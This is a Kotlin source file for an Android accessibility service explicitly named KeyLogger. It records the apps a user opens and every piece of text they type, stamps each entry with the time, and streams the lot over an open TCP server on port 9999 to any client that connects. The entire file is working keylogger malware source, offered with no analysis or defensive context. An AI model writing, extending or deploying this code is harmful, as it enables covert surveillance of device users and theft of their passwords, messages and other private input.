package com.example.keylogger

import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.DataOutputStream
import java.io.IOException
import java.io.PrintWriter
import java.net.ServerSocket
import java.text.SimpleDateFormat
import java.util.Date


class KeyLogger : AccessibilityService() {
    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
    private val clients = ArrayList<DataOutputStream>()
    override fun onServiceConnected() {
        super.onServiceConnected()

        Log.d("keylogger", "Service Connected")
        try {
            coroutineScope.launch { startServer() }
        } catch (e: IOException) {
            throw RuntimeException(e)
        }
    }

    @SuppressLint("NewApi")
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val packageName = "[PackageName]" + event.packageName as String
                coroutineScope.launch { sendToClient(packageName) }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss") //设置日期格式
                val currentTime = "[" + dateFormat.format(Date()) + "]" // new Date()为获取当前系统时间
                val text = currentTime + event.text.toString()
                coroutineScope.launch { sendToClient(text) }
            }

            else -> {}
        }
    }

    override fun onInterrupt() {}

    @Throws(IOException::class)
    private fun startServer() {
        try {
            val serverSocket = ServerSocket(9999)
            while (true) {
                val client = serverSocket.accept()
                clients.add(DataOutputStream(client.getOutputStream()))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendToClient(message: String) {
        Log.d("keylogger", message + " " + clients.size)
        try {
            for (client in clients) {
                client.writeUTF(message)
            }
            Log.d("keylogger", message)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
